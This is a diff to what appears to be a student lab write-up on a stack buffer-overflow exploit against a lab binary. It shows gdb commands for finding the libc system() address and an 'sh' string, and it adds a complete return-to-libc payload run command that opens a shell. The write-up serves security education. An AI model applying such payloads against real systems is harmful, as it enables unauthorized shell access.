@@ -46,7 +46,7 @@ After causing the program to crash, you must then try to find what the proper in
 
 To exploit we want the system to open a shell.  To do this we must develop shell code that will place the code we are trying to execute into the buffer we are overflowing and overwrite the return address so it points back into the buffer.  
 
-To do this we must locate where the ```system``` call resides on our machine.
+To do this we must locate where the ```system``` call resides on our machine.  Using help from a Piazza thread []
 
 ```
 (gdb) b main
@@ -62,7 +62,7 @@ $1 = {<text variable, no debug info>} 0xb7e56190 <__libc_system>
 
 When we issue the ```(gdb) print system``` command when the program is running we are given ```0xb7e56190``` as the location for the system command.  
 
-To locate the location of a ```sh``` string to inject we search for ```sh``` in memory.  We dump the files that have symbols from out program and do a search across their memory by ```(gdb) find addr1,addr2,"sh"```
+To locate the location of a ```sh``` string to inject we search for ```sh``` in memory.  We dump the files that have symbols from out program and do a search across their memory by ```(gdb) find addr1,addr2,"sh"``` 
 
 ```
 (gdb) info files
@@ -198,6 +198,10 @@ But do to the way these are pushed onto the stack, we need to reverse them and i
 
 
 or in total ```12345678123456781234\x90\x61\xe5\xb7RETA\xf5\x40\xf7\xb7```
+
+```
+(gdb) r `python -c 'print "12345678123456781234\x90\x61\xe5\xb7RETA\x11\xde\xff\xb7"'`
+```
 
 # Task 2:
 
